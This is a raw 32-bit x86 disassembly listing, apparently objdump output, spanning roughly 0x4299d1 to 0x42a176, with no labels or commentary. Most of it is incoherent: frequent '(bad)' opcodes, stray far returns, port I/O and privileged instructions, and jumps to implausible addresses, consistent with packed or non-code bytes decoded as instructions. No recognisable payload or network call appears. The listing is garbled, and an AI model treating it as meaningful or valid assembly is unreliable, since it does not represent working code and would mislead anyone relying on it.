  4299d1:	jmp    0x42995f
  4299d3:	mov    bl,BYTE PTR [esi-0x7674cdfb]
  4299d9:	rol    ah,1
  4299db:	mov    esi,0xf133104d
  4299e0:	mov    edx,0xff358d80
  4299e5:	mov    dh,0xd1
  4299e7:	cmp    edx,DWORD PTR [ebp+0xf]
  4299ea:	mov    eax,DWORD PTR [edx-0x20]
  4299ed:	add    BYTE PTR [ebp-0x75],bh
  4299f0:	xor    edi,DWORD PTR [ebx+eax*1-0x307bf035]
  4299f7:	sahf   
  4299f8:	retf   0x8632
  4299fb:	cmp    ebp,0x8
  4299fe:	call   ebx
  429a00:	inc    ebp
  429a01:	inc    ebp
  429a02:	mov    ecx,DWORD PTR [ebx+0x450008d8]
  429a08:	mov    esi,DWORD PTR ds:0xc7049cc8
  429a0e:	add    al,al
  429a10:	add    bl,al
  429a12:	(bad)  
  429a13:	clc    
  429a14:	enter  0x45,0x35
  429a18:	push   eax
  429a19:	pushf  
  429a1a:	mov    edi,eax
  429a1c:	int3   
  429a1d:	or     al,al
  429a1f:	test   DWORD PTR [edi],edi
  429a21:	clc    
  429a22:	gs inc ebp
  429a24:	add    BYTE PTR [ebx+0x4d00fc7d],cl
  429a2a:	push   ss
  429a2b:	xor    ecx,DWORD PTR [ebp+0x3]
  429a2e:	sub    edx,DWORD PTR [ecx-0x76]
  429a31:	dec    ebp
  429a32:	add    DWORD PTR [ebx+0x88d845],ecx
  429a38:	mov    esi,DWORD PTR [ebx]
  429a3a:	or     BYTE PTR [ebx],al
  429a3c:	cmp    edx,DWORD PTR [ecx-0x38]
  429a3f:	dec    ebp
  429a40:	out    dx,eax
  429a41:	xor    eax,DWORD PTR [ebp+0x3]
  429a44:	mov    edx,DWORD PTR [ecx-0x28]
  429a47:	dec    ebp
  429a48:	add    BYTE PTR [ebx],dh
  429a4a:	push   0x518003
  429a4f:	push   eax
  429a50:	add    BYTE PTR [ebx-0x300748b],cl
  429a56:	sbb    BYTE PTR [ebp+0x45],cl
  429a59:	mov    ecx,DWORD PTR [ecx+0x7d00d0d8]
  429a5f:	xor    ecx,DWORD PTR [ebx-0x3cae0bfd]
  429a65:	dec    ebp
  429a66:	inc    ebp
  429a67:	xor    eax,esp
  429a69:	add    eax,esp
  429a6b:	push   ecx
  429a6c:	(bad)  
  429a6d:	dec    ebp
  429a6e:	mov    al,ds:0xc9e031ff
  429a73:	retf   
  429a74:	(bad)  
  429a75:	into   
  429a76:	sub    bh,bh
  429a78:	dec    esp
  429a79:	adc    al,0x9c
  429a7b:	inc    ebp
  429a7c:	push   ebp
  429a7d:	test   DWORD PTR [edi],ecx
  429a7f:	unpcklps xmm0,XMMWORD PTR [ecx-0x7ab6ff80]
  429a86:	jmp    0xc9bba99a
  429a8b:	add    cl,dl
  429a8d:	mov    DWORD PTR [ebp+0x8501c0],0x33454df8
  429a97:	xor    ecx,DWORD PTR [ebp+0x728b089c]
  429a9d:	rol    BYTE PTR [eax],0x57
  429aa0:	clc    
  429aa1:	bound  esi,QWORD PTR [edx+0x7]
  429aa4:	mov    eax,DWORD PTR [ebp-0x30]
  429aa7:	xor    al,0x40
  429aa9:	sub    al,0xc7
  429aab:	mov    ah,ch
  429aad:	add    DWORD PTR [ebp+0x4534f845],eax
  429ab3:	sub    al,0x86
  429ab5:	mov    BYTE PTR [edx+eax*1-0x335a39],bl
  429abc:	mov    ch,0xff
  429abe:	clc    
  429abf:	add    DWORD PTR [ebp+0x60],0x31
  429ac3:	call   FWORD PTR [eax+eax*1-0x1f7a77]
  429aca:	inc    ebp
  429acb:	dec    DWORD PTR [ebx-0x341ff701]
  429ad1:	test   esi,ecx
  429ad3:	dec    DWORD PTR [ebx-0x7f8a3301]
  429ad9:	push   eax
  429ada:	add    DWORD PTR [ebp+0x0],eax
  429add:	dec    ebx
  429adf:	or     al,0xce
  429ae1:	ror    BYTE PTR [ebx-0x34173fb0],0x4
  429ae8:	into   
  429ae9:	add    BYTE PTR [ebx-0x34ff1400],cl
  429aef:	mov    esi,ecx
  429af1:	sar    bh,0x45
  429af4:	adc    al,0x8b
  429af6:	clc    
  429af7:	fadd   DWORD PTR [ebp+0x0]
  429afa:	mov    ebp,DWORD PTR [edx+0x8]
  429afd:	push   edi
  429afe:	adc    BYTE PTR [eax+0x1],0x83
  429b02:	add    al,al
  429b04:	retf   
  429b05:	mov    ecx,esi
  429b07:	cld    
  429b08:	mov    eax,DWORD PTR [eax+0xcb01cc]
  429b0e:	into   
  429b0f:	add    BYTE PTR [ebx+0x756aec00],cl
  429b15:	jne    0x429b4a
  429b17:	inc    DWORD PTR [ebx]
  429b19:	rcl    BYTE PTR [ecx+0x50],1
  429b1c:	push   eax
  429b1d:	mov    ecx,DWORD PTR [ecx-0xbaf7f8]
  429b23:	mov    eax,DWORD PTR [eax+eiz*8-0x14ffbafd]
  429b2a:	sar    bh,0x84
  429b2d:	or     BYTE PTR [ebx],al
  429b2f:	push   eax
  429b30:	add    BYTE PTR [ebx+0x4532c845],cl
  429b36:	pushf  
  429b37:	xor    eax,0x89b49cc7
  429b3c:	test   eax,ebp
  429b3e:	clc    
  429b3f:	inc    ebp
  429b40:	inc    ebp
  429b41:	mov    DWORD PTR [eax+eax*8],esi
  429b44:	sub    al,0x34
  429b46:	mov    BYTE PTR [ebx+ecx*4+0x57d8ec89],bl
  429b4d:	dec    ebp
  429b4e:	bound  esi,QWORD PTR [ebx]
  429b50:	inc    edi
  429b51:	add    ecx,DWORD PTR [ebx+0x57f4b489]
  429b57:	dec    ebp
  429b58:	bound  esi,QWORD PTR [ebx]
  429b5a:	inc    edi
  429b5b:	add    eax,DWORD PTR [ebx-0xf7a377]
  429b61:	inc    ebp
  429b62:	add    ch,dl
  429b64:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429b65:	pushf  
  429b66:	inc    edi
  429b68:	dec    esp
  429b6a:	lea    eax,[ebp+0x45fff860]
  429b70:	push   eax
  429b71:	xor    dh,BYTE PTR [ebp-0x64]
  429b74:	(bad)  
  429b75:	(bad)  
  429b76:	pop    esp
  429b77:	lods   al,BYTE PTR ds:[esi]
  429b78:	inc    DWORD PTR [ebp+0x4508f8ff]
  429b7e:	mov    esi,DWORD PTR [eax]
  429b80:	rcr    BYTE PTR [eax+esi*2+0x10b883c7],1
  429b87:	test   DWORD PTR [edi-0x8],edx
  429b8a:	inc    esi
  429b8b:	inc    ebp
  429b8c:	add    BYTE PTR [esi],bh
  429b8e:	push   0x8b809c
  429b93:	in     al,dx
  429b94:	inc    ebp
  429b95:	push   ebp
  429b96:	mov    esi,DWORD PTR [ebx]
  429b98:	cld    
  429b99:	add    eax,DWORD PTR [eax+0xf013b]
  429b9f:	adc    al,0x0
  429ba1:	add    bh,bh
  429ba3:	jmp    0xbf9cc0
  429ba8:	add    BYTE PTR [ebp+0x45],cl
  429bab:	mov    ecx,DWORD PTR [ebx+0xd1d8e8]
  429bb1:	dec    ebp
  429bb2:	push   0x38033
  429bb7:	cmp    eax,DWORD PTR [eax]
  429bb9:	unpcklps xmm7,xmm0
  429bbc:	jne    0x429bbe
  429bbe:	dec    DWORD PTR [ebx+0x5545cc18]
  429bc4:	mov    DWORD PTR [ebx],esi
  429bc6:	shl    BYTE PTR [ebx],1
  429bc8:	inc    ebp
  429bc9:	add    ecx,DWORD PTR [ecx+0x60fc803]
  429bcf:	retf   0x5575
  429bd2:	dec    DWORD PTR [ebx-0x5ba17e8]
  429bd8:	(bad)  
  429bd9:	stc    
  429bda:	in     al,dx
  429bdb:	or     al,0x85
  429bdd:	dec    ebp
  429bde:	clc    
  429bdf:	xor    eax,DWORD PTR [ebp+0x3]
  429be2:	mov    ebp,ecx
  429be4:	rol    BYTE PTR [eax],1
  429be6:	inc    ebp
  429be7:	add    BYTE PTR [eax-0x7747ab3],bh
  429bed:	clc    
  429bee:	inc    ebp
  429bef:	retf   
  429bf0:	mov    edx,ebx
  429bf2:	in     al,dx
  429bf3:	(bad)  
  429bf4:	retf   
  429bf5:	into   
  429bf6:	into   
  429bf7:	scas   eax,DWORD PTR es:[edi]
  429bf8:	dec    ebp
  429bf9:	mov    ecx,DWORD PTR [ebx-0x3482130c]
  429bff:	sub    ecx,esi
  429c01:	cmp    ecx,DWORD PTR [ebp+0x77]
  429c04:	(bad)  
  429c05:	mov    edi,eax
  429c07:	int3   
  429c08:	test   DWORD PTR [ecx-0x74baff08],ecx
  429c0e:	xor    ebp,DWORD PTR [esp+ebx*4-0x57cc38ab]
  429c15:	xor    eax,DWORD PTR [ebp+0x4503f803]
  429c1b:	rdtsc  
  429c1d:	retf   0x559c
  429c20:	(bad)  
  429c21:	mov    esp,DWORD PTR [eax+ebp*8-0x607057b]
  429c28:	inc    ebp
  429c29:	add    eax,0xeb9c4d3f
  429c2e:	(bad)  
  429c2f:	mov    esi,DWORD PTR [eax-0x7aa7a5c]
  429c35:	xor    ecx,DWORD PTR [ebp+0x33]
  429c38:	mov    eax,DWORD PTR [ebx]
  429c3a:	call   0xce526742
  429c3f:	retf   0x55d1
  429c42:	test   BYTE PTR [ebx-0x5ff17fe],cl
  429c48:	jmp    0x429c43
  429c4a:	add    BYTE PTR ds:0xebf44d8b,al
  429c50:	push   ebp
  429c51:	mov    ebp,DWORD PTR [ebx]
  429c53:	mov    eax,0x33f8558b
  429c58:	retf   
  429c59:	xor    ecx,esi
  429c5b:	add    edx,ecx
  429c5d:	add    eax,DWORD PTR [edx+0xca010f]
  429c63:	push   ebp
  429c64:	dec    ebp
  429c65:	mov    ecx,DWORD PTR [ebx-0x34050718]
  429c6b:	stc    
  429c6c:	rol    DWORD PTR ds:0xebce4dd6,cl
  429c72:	scas   eax,DWORD PTR es:[edi]
  429c73:	mov    ecx,DWORD PTR [ebx+0x7d55f4b0]
  429c79:	xor    ebp,DWORD PTR [ebx]
  429c7b:	xor    edi,DWORD PTR [ebx]
  429c7d:	add    esi,DWORD PTR [edi+0x3]
  429c80:	mov    ecx,DWORD PTR [edi]
  429c82:	clc    
  429c83:	retf   0x55cb
  429c86:	into   
  429c87:	mov    edi,DWORD PTR [eax+ebp*8-0x6740600]
  429c8e:	test   al,0x4d
  429c90:	push   ebp
  429c91:	jbe    0x429cc6
  429c93:	mov    esi,DWORD PTR [ebx]
  429c95:	mov    al,0x3
  429c97:	push   ebp
  429c98:	add    esi,DWORD PTR [ebx]
  429c9a:	rdpmc  
  429c9c:	retf   0x5503
  429c9f:	add    ecx,DWORD PTR [ebx-0x53517f1]
  429ca5:	dec    ebp
  429ca6:	stc    
  429ca7:	mov    ecx,DWORD PTR [eax]
  429ca9:	or     BYTE PTR [ebp+0x4d],cl
  429cac:	jmp    0x1369d3c
  429cb1:	dec    ebp
  429cb2:	dec    ebp
  429cb3:	(bad)  
  429cb4:	mov    ebx,esp
  429cb6:	clc    
  429cb7:	test   ebx,ecx
  429cb9:	clc    
  429cba:	ror    DWORD PTR [ebp-0x2a],cl
  429cbd:	mov    esi,ecx
  429cbf:	lock scas eax,DWORD PTR es:[edi]
  429cc1:	inc    ebp
  429cc2:	mov    esi,DWORD PTR [ebx]
  429cc4:	hlt    
  429cc5:	pushf  
  429cc6:	jge    0x429c53
  429cc8:	sub    ebx,esp
  429cca:	cmp    ecx,ebx
  429ccc:	ja     0x429c9c
  429cce:	mov    ebp,DWORD PTR [eax-0x58]
  429cd1:	dec    ebp
  429cd2:	xor    ecx,DWORD PTR [di+0x3]
  429cd6:	mov    esp,esp
  429cd8:	clc    
  429cd9:	push   ebp
  429cda:	retf   
  429cdb:	mov    dl,bl
  429cdd:	adc    esi,edx
  429cdf:	jb     0x429caf
  429ce1:	add    BYTE PTR [edi-0xb7474b3],ch
  429ce7:	lock jge 0x429cb5
  429cea:	sub    ecx,DWORD PTR [ebp+0x3b]
  429ced:	mov    esi,DWORD PTR [edi-0x20]
  429cf0:	mov    ecx,DWORD PTR [esp+ebp*4+0x4d32459e]
  429cf7:	mov    BYTE PTR [ebx-0x34b20729],cl
  429cfd:	mov    edx,ebx
  429cff:	lock (bad) 
  429d01:	ror    esi,cl
  429d03:	push   ebp
  429d04:	scas   eax,DWORD PTR es:[edi]
  429d05:	mov    ecx,DWORD PTR [ebx+0x7d8cf4e0]
  429d0b:	sahf   
  429d0c:	sub    esi,DWORD PTR [edx]
  429d0e:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  429d14:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429d15:	xor    esp,DWORD PTR [ebx]
  429d17:	add    ecx,DWORD PTR [ebp-0x1c]
  429d1a:	mov    edi,DWORD PTR [ebp-0x8]
  429d1d:	mov    bl,cl
  429d1f:	cmp    dl,bl
  429d21:	jb     0x429cf1
  429d23:	add    dh,dl
  429d25:	dec    ebp
  429d26:	scas   eax,DWORD PTR es:[edi]
  429d27:	mov    ecx,DWORD PTR [ebx+0x7dcbf4f0]
  429d2d:	shr    DWORD PTR [ebx],cl
  429d2f:	into   
  429d30:	cmp    edx,esi
  429d32:	mov    ebp,DWORD PTR [edi-0x1bfcfc48]
  429d38:	dec    ebp
  429d39:	dec    ebp
  429d3a:	mov    ecx,DWORD PTR [ebx+0x55d3f0f8]
  429d40:	retf   
  429d41:	xor    edx,esi
  429d43:	add    ecx,esi
  429d45:	imul   ecx,edx
  429d48:	mov    DWORD PTR [ebp+0x8],edx
  429d4b:	xor    ecx,DWORD PTR [ebp+0x2b]
  429d4e:	mov    DWORD PTR [ebx+0x7d4df0ec],ecx
  429d54:	add    esi,DWORD PTR [ebx]
  429d56:	rol    BYTE PTR [ebx],0x45
  429d59:	sysexit 
  429d5b:	xlat   BYTE PTR ds:[ebx]
  429d5c:	pushf  
  429d5d:	jge    0x429ce8
  429d5f:	xor    esp,eax
  429d61:	sub    eax,DWORD PTR [ebp-0x73]
  429d64:	(bad)  
  429d65:	cmp    dh,BYTE PTR [edx+esi*2-0x2e07ff7b]
  429d6c:	dec    ebp
  429d6d:	xchg   BYTE PTR [ebx],dh
  429d6f:	inc    DWORD PTR [ebx]
  429d71:	(bad)  
  429d72:	jmp    0x429dc1
  429d74:	mov    ecx,DWORD PTR [ebx-0x34341324]
  429d7a:	dec    ebp
  429d7b:	into   
  429d7c:	mov    ebp,DWORD PTR [edi-0x23737420]
  429d82:	sahf   
  429d83:	shl    DWORD PTR [edx],cl
  429d85:	retf   0x5588
  429d88:	or     ecx,DWORD PTR [ebp+0x7233114d]
  429d8e:	add    eax,DWORD PTR [eax]
  429d90:	in     al,0x4d
  429d92:	push   ebp
  429d93:	mov    ecx,DWORD PTR [edx+0x72cb11d8]
  429d99:	bound  eax,QWORD PTR [eax]
  429d9b:	int    0x4d
  429d9d:	sub    ecx,DWORD PTR [edx+0x55e80b03]
  429da3:	dec    ebp
  429da4:	xor    ecx,DWORD PTR [ebx-0x341b0bfd]
  429daa:	jge    0x429d7a
  429dac:	mov    BYTE PTR [edi+0xf723b3a],ch
  429db2:	add    cl,dh
  429db4:	dec    ebp
  429db5:	dec    DWORD PTR [ebx-0x2c032301]
  429dbb:	inc    ebp
  429dbc:	push   ebp
  429dbd:	dec    DWORD PTR [ebx-0x73ff1f34]
  429dc3:	lea    ebx,[esi-0x7400cdac]
  429dc9:	push   eax
  429dca:	mov    ah,0x45
  429dcc:	push   ebp
  429dcd:	mov    esi,DWORD PTR [ebx]
  429dcf:	les    esi,FWORD PTR [ebx]
  429dd1:	add    BYTE PTR [ebx],al
  429dd3:	inc    DWORD PTR [ebx]
  429dd5:	mov    ecx,DWORD PTR [edi]
  429dd7:	cld    
  429dd8:	retf   0x4d80
  429ddb:	add    DWORD PTR [ecx+0x4d30e400],ecx
  429de1:	jne    0x429d6e
  429de3:	(bad)  
  429de4:	in     al,dx
  429de5:	ror    bl,1
  429de7:	clc    
  429de8:	into   
  429de9:	add    BYTE PTR [edi-0xf2f7475],ch
  429def:	not    bl
  429df1:	adc    al,0xca
  429df3:	inc    ebp
  429df4:	push   ebp
  429df5:	mov    ecx,DWORD PTR [ebx-0x2cff1b28]
  429dfb:	push   0xaf80d6
  429e00:	mov    eax,DWORD PTR [eax]
  429e02:	fdiv   st(7),st
  429e04:	sti    
  429e05:	sbb    dh,cl
  429e07:	pop    esi
  429e08:	xchg   esp,eax
  429e09:	leave  
  429e0a:	sahf   
  429e0b:	add    al,0x32
  429e0d:	push   ebp
  429e0e:	cmp    ebp,esp
  429e10:	sqrtps xmm3,XMMWORD PTR [esi+0x45]
  429e14:	dec    DWORD PTR [ecx-0x740f0375]
  429e1a:	push   ebp
  429e1b:	cld    
  429e1c:	xor    ecx,DWORD PTR [edi-0x76f07efd]
  429e22:	retf   0x558b
  429e25:	clc    
  429e26:	xor    esi,eax
  429e28:	add    esi,DWORD PTR [ebp-0x75]
  429e2b:	(bad)  
  429e2c:	hlt    
  429e2d:	or     cl,BYTE PTR [esi+eax*8-0x39cdf762]
  429e34:	mov    DWORD PTR [edx],ecx
  429e36:	hlt    
  429e37:	(bad)  
  429e38:	dec    ebp
  429e39:	add    dh,BYTE PTR [ebx]
  429e3b:	leave  
  429e3c:	mov    edx,0xffec8d55
  429e41:	push   ecx
  429e42:	rol    DWORD PTR [ebp+0x55],1
  429e45:	mov    DWORD PTR [ebx+0x7d55d8fc],ecx
  429e4b:	mov    eax,0xf8030b33
  429e50:	lar    ecx,di
  429e53:	push   ebp
  429e54:	retf   0x863b
  429e57:	jne    0x429e56
  429e59:	mov    edi,edi
  429e5b:	or     BYTE PTR [ebp+0x41],dh
  429e5e:	mov    esp,eax
  429e60:	cld    
  429e61:	inc    eax
  429e62:	mov    al,0x29
  429e64:	add    DWORD PTR [ecx+0x0],eax
  429e67:	loope  0x429dee
  429e69:	inc    ecx
  429e6a:	call   eax
  429e6c:	inc    edx
  429e6e:	mov    eax,DWORD PTR [eax]
  429e70:	cld    
  429e71:	mov    eax,DWORD PTR [eax+0x8d0151]
  429e77:	clc    
  429e78:	xor    BYTE PTR [ebp+0x45],al
  429e7b:	mov    ecx,DWORD PTR [ebx+0x8fc0fc]
  429e81:	loopne 0x429e82
  429e83:	mov    edi,edi
  429e85:	mov    ecx,eax
  429e87:	clc    
  429e88:	jne    0x429e5a
  429e8a:	call   0x83af93
  429e8f:	sub    DWORD PTR [ebp+0x45],esi
  429e92:	test   esi,eax
  429e94:	je     0x429e97
  429e96:	mov    eax,esi
  429e98:	cld    
  429e99:	or     DWORD PTR [eax+0x401c9],eax
  429e9f:	push   ebp
  429ea0:	add    ah,ch
  429ea2:	add    BYTE PTR [ecx+0x6a],dl
  429ea5:	inc    ebp
  429ea6:	push   esi
  429ea7:	mov    DWORD PTR [eax-0x4],edx
  429eaa:	pop    edi
  429eab:	mov    ebx,DWORD PTR [ebx-0x4]
  429eae:	ret    0xbe
  429eb1:	push   es
  429eb2:	mov    ecx,DWORD PTR [ecx-0x77274af]
  429eb8:	clc    
  429eb9:	lock inc ebp
  429ebb:	jne    0x429f13
  429ebd:	(bad)  
  429ebe:	jne    0x429ec4
  429ec0:	mov    eax,0xf841ba66
  429ec5:	rol    BYTE PTR [esi],1
  429ec7:	(bad)  
  429ec8:	jne    0x429efb
  429eca:	cmp    eax,ebx
  429ecc:	pop    esi
  429ecd:	mov    ecx,DWORD PTR [eax]
  429ecf:	push   ecx
  429ed0:	inc    ecx
  429ed1:	lea    edi,[eax+edi*8+0x42]
  429ed5:	inc    ebp
  429ed6:	ror    DWORD PTR [ebx-0x408303be],0x41
  429edd:	xchg   edx,ebp
  429edf:	mov    ebx,eax
  429ee1:	mov    ecx,DWORD PTR [ebx-0x722fae08]
  429ee7:	or     edi,eax
  429ee9:	inc    ebp
  429eea:	inc    ebp
  429eeb:	(bad)  
  429eec:	mov    ecx,DWORD PTR [eax]
  429eee:	cld    
  429eef:	(bad)  
  429ef0:	jmp    0x429ef3
  429ef2:	mov    eax,esi
  429ef4:	mov    DWORD PTR ds:0x4f8c98b,eax
  429efa:	rcl    BYTE PTR [esi+0xf],1
  429efd:	iret   
  429efe:	inc    ebp
  429eff:	leave  
  429f00:	(bad)  
  429f01:	dec    DWORD PTR [ecx]
  429f03:	mov    eax,esi
  429f05:	mov    eax,DWORD PTR [edi]
  429f07:	mov    dh,0xd1
  429f0a:	push   es
  429f0b:	nop
  429f0c:	(bad)  
  429f0d:	inc    DWORD PTR [ebx]
  429f0f:	push   esi
  429f10:	leave  
  429f11:	iret   
  429f12:	add    al,0x46
  429f14:	push   ebp
  429f15:	in     eax,0xec
  429f17:	push   ebp
  429f18:	push   ecx
  429f19:	inc    DWORD PTR [ebp+0x56]
  429f1c:	mov    DWORD PTR [esi-0x4],eax
  429f1f:	loope  0x429f76
  429f21:	sbb    BYTE PTR [eax+0x7c6daff],bh
  429f27:	add    al,BYTE PTR [edx]
  429f29:	mov    edx,DWORD PTR [ebp-0x17]
  429f2c:	cmp    edi,esi
  429f2e:	jne    0x429f2f
  429f30:	(bad)  
  429f31:	push   esi
  429f32:	pop    es
  429f33:	push   ebp
  429f34:	mov    ebp,esp
  429f36:	or     BYTE PTR [ebp+0x41],al
  429f39:	add    edi,edx
  429f3b:	sub    BYTE PTR [eax-0x4],al
  429f3e:	shl    BYTE PTR [ebp-0x3e],0x1
  429f42:	add    BYTE PTR [ebx+ecx*4],bl
  429f45:	mov    edx,DWORD PTR [ecx+0x14]
  429f48:	lea    edx,[edx-0x1ba7508]
  429f4e:	push   esi
  429f4f:	enter  0xd375,0xb8
  429f53:	test   DWORD PTR [esi],0x6ce0750
  429f59:	enter  0xd375,0x3b
  429f5d:	neg    DWORD PTR [esi+0x50]
  429f60:	or     cl,dl
  429f62:	inc    edx
  429f63:	(bad)  
  429f64:	in     eax,dx
  429f65:	in     al,dx
  429f66:	(bad)  
  429f67:	sub    eax,DWORD PTR [ebx]
  429f69:	inc    eax
  429f6a:	in     eax,dx
  429f6b:	push   eax
  429f6c:	add    dl,BYTE PTR [eax-0x37]
  429f6f:	push   edi
  429f70:	push   ebp
  429f71:	imul   ah
  429f73:	adc    DWORD PTR [ecx-0x1],0x45
  429f77:	add    BYTE PTR [ecx+0x55d3fc00],cl
  429f7d:	lea    edi,[eax-0x7fff4ca]
  429f83:	mov    eax,0x4550402
  429f88:	cmp    ebp,ecx
  429f8a:	jne    0x429f37
  429f8c:	mov    eax,DWORD PTR ds:0x241e808
  429f92:	loope  0x429f94
  429f94:	inc    eax
  429f95:	stc    
  429f96:	xlat   BYTE PTR ds:[ebx]
  429f97:	ss inc ecx
  429f99:	aas    
  429f9a:	in     eax,0x7d
  429f9c:	ret    0x8b
  429f9f:	lock mov edi,DWORD PTR [ebp-0x18]
  429fa3:	and    edi,edi
  429fa5:	mov    edi,edi
  429fa7:	call   0xe410a083
  429fac:	push   es
  429fad:	add    al,ch
  429faf:	ud0    edx,DWORD PTR [ebp-0x7574ff01]
  429fb6:	(bad)  
  429fb7:	hlt    
  429fb8:	add    eax,0xffd3e87d
  429fbd:	cmp    bh,0x8
  429fc0:	(bad)  
  429fc1:	fld    DWORD PTR [esi]
  429fc3:	out    dx,al
  429fc4:	call   0xffa19ecc
  429fc9:	cmp    al,0x46
  429fcb:	shr    edx,0x8
  429fce:	(bad)  
  429fcf:	pop    es
  429fd0:	fisttp QWORD PTR [ebp+0xe577eff]
  429fd6:	push   ebx
  429fd7:	add    BYTE PTR [ebx+0x24008b56],cl
  429fdd:	add    BYTE PTR [ebp+0x50],al
  429fe0:	push   eax
  429fe1:	add    DWORD PTR [ebx+0x757d1834],ecx
  429fe7:	sub    edx,DWORD PTR [esi-0x24]
  429fea:	jne    0x429fa2
  429fec:	lods   eax,DWORD PTR ds:[esi]
  429fed:	mov    edx,DWORD PTR [edx-0x34]
  429ff0:	dec    esi
  429ff1:	out    0x83,eax
  429ff3:	into   
  429ff4:	push   edi
  429ff6:	loopne 0x429fc6
  429ff8:	shr    BYTE PTR [edx+ecx*4+0x0],1
  429ffc:	xor    DWORD PTR [eax-0x741fff01],0xffffffd0
  42a003:	rol    DWORD PTR [edx],0x8
  42a006:	mov    esp,ecx
  42a008:	cmp    DWORD PTR [ebx],0xc
  42a00b:	mov    esi,0x5001c0
  42a010:	push   eax
  42a011:	push   cs
  42a012:	push   eax
  42a013:	(bad)  
  42a014:	sub    edx,edi
  42a016:	push   esi
  42a017:	adc    al,0xcb
  42a019:	ins    DWORD PTR es:[edi],dx
  42a01a:	mov    eax,0x203e8
  42a01f:	add    al,ah
  42a021:	inc    esi
  42a022:	mov    al,ch
  42a024:	pop    es
  42a025:	add    DWORD PTR [eax],0x1
  42a028:	add    dh,al
  42a02a:	add    ah,ch
  42a02c:	rol    DWORD PTR [edx-0xd],1
  42a02f:	cli    
  42a030:	push   0x4a
  42a032:	pop    ecx
  42a033:	retf   0xfe6
  42a036:	add    BYTE PTR [ebx-0x4e72f41e],al
  42a03c:	(bad)  
  42a03d:	dec    BYTE PTR [ebx+0x45b1fc72]
  42a043:	(bad)  
  42a044:	sub    ebp,DWORD PTR [ebx]
  42a046:	and    al,0x52
  42a048:	(bad)  
  42a049:	dec    edi
  42a04a:	inc    ebp
  42a04b:	shl    DWORD PTR [eax+0x24fe8c8],0x0
  42a052:	add    BYTE PTR [ebp-0x7b],dh
  42a055:	pop    eax
  42a056:	add    BYTE PTR [edx+0x0],bl
  42a059:	pop    edx
  42a05a:	dec    ebp
  42a05b:	jmp    DWORD PTR [ebx]
  42a05d:	and    al,0xec
  42a05f:	push   edx
  42a060:	out    0x64,eax
  42a062:	jmp    0xd3f49667
  42a067:	jmp    0x42a0c1
  42a069:	mov    al,0xfe
  42a06b:	dec    BYTE PTR [ebp-0x18fd8018]
  42a071:	add    BYTE PTR [esi+ebp*1],bh
  42a074:	pop    edx
  42a075:	icebp  
  42a076:	mov    eax,cs
  42a078:	ins    BYTE PTR es:[edi],dx
  42a079:	adc    eax,0x75510000
  42a07e:	mov    esi,0x70158
  42a083:	or     DWORD PTR [eax-0x74f48dfe],esi
  42a089:	mov    edi,esp
  42a08b:	cld    
  42a08c:	jge    0x42a103
  42a08e:	(bad)  
  42a090:	aas    
  42a091:	and    al,0x6d
  42a093:	adc    cl,0x1
  42a096:	mov    eax,DWORD PTR [eax]
  42a098:	and    ecx,DWORD PTR [ebx-0x167203fd]
  42a09e:	dec    ebp
  42a09f:	add    eax,ebp
  42a0a1:	add    BYTE PTR [edx],al
  42a0a3:	fadd   DWORD PTR [eax]
  42a0a5:	stc    
  42a0a6:	enter  0xee00,0x8b
  42a0aa:	sbb    eax,0x1
  42a0ad:	sbb    esi,ecx
  42a0af:	in     al,0x0
  42a0b1:	in     eax,dx
  42a0b2:	add    BYTE PTR [eax],al
  42a0b4:	jne    0x42a041
  42a0b6:	cmp    edx,esp
  42a0b8:	jb     0x42a0c3
  42a0ba:	jmp    0x42a131
  42a0bc:	mov    ecx,DWORD PTR [ebx+0x4d91d4cc]
  42a0c2:	add    BYTE PTR [ebx+0x4d83d840],cl
  42a0c8:	add    DWORD PTR [ebx+0x4d3bdcee],ecx
  42a0ce:	jb     0x42a059
  42a0d0:	pop    edx
  42a0d1:	fadd   QWORD PTR [ebx-0x7445faa1]
  42a0d7:	or     dh,BYTE PTR [edx+0x0]
  42a0da:	inc    edx
  42a0db:	or     dl,bh
  42a0dd:	xlat   BYTE PTR ds:[ebx]
  42a0de:	dec    edx
  42a0df:	push   edi
  42a0e0:	add    al,0x7
  42a0e2:	leave  
  42a0e3:	rol    DWORD PTR [edx+eax*1],0x7
  42a0e7:	add    ecx,ecx
  42a0e9:	mov    edx,ecx
  42a0eb:	int3   
  42a0ec:	jmp    0x42a0ac
  42a0ee:	mov    al,0x0
  42a0f0:	(bad)  
  42a0f1:	jne    0x42a0db
  42a0f3:	mov    eax,DWORD PTR [edx]
  42a0f5:	call   0xc1571dfa
  42a0fa:	pop    edi
  42a0fb:	add    ebx,DWORD PTR [ecx-0x37]
  42a0fe:	pop    ecx
  42a0ff:	or     BYTE PTR [ecx*4-0x1445b8af],dh
  42a106:	push   es
  42a107:	mov    eax,DWORD PTR [eax]
  42a109:	int3   
  42a10a:	add    ch,al
  42a10c:	jae    0x42a0f6
  42a10e:	int    0x1
  42a110:	enter  0x3000,0x18
  42a114:	add    BYTE PTR [ebp+0x75],al
  42a117:	mov    esi,DWORD PTR [eax-0x171f0134]
  42a11d:	push   0x2
  42a11f:	pop    ecx
  42a120:	add    BYTE PTR [eax],cl
  42a122:	push   ebx
  42a123:	lea    edi,[edi+eax*2]
  42a126:	mov    al,0x1
  42a128:	jb     0x42a12a
  42a12a:	mov    al,0x10
  42a12c:	push   eax
  42a12d:	add    al,0x75
  42a12f:	add    BYTE PTR [ebx],ch
  42a131:	add    ebx,esp
  42a133:	int3   
  42a134:	jne    0x42a146
  42a136:	movsx  edx,cl
  42a139:	add    DWORD PTR [eax],eax
  42a13b:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  42a142:	mov    gs,edi
  42a144:	add    BYTE PTR [eax-0x50],ch
  42a147:	add    al,ch
  42a149:	mov    eax,DWORD PTR [ecx]
  42a14b:	sub    eax,DWORD PTR [eax]
  42a14d:	jb     0x42a1c4
  42a14f:	add    DWORD PTR [esp+eiz*8-0x50],esi
  42a153:	jge    0x42a13d
  42a155:	add    al,0x1
  42a157:	add    DWORD PTR [eax],0x0
  42a15a:	jne    0x42a15c
  42a15c:	je     0x42a1a3
  42a15e:	mov    eax,DWORD PTR [edi]
  42a160:	ror    BYTE PTR [ebp+0x4d],1
  42a163:	or     DWORD PTR [ecx+0x4d03d004],0x3
  42a16a:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  42a170:	mov    DWORD PTR [ebx],ebp
  42a172:	fadd   DWORD PTR [eax+0x75]
  42a175:	inc    eax
  42a176:	pop    eax
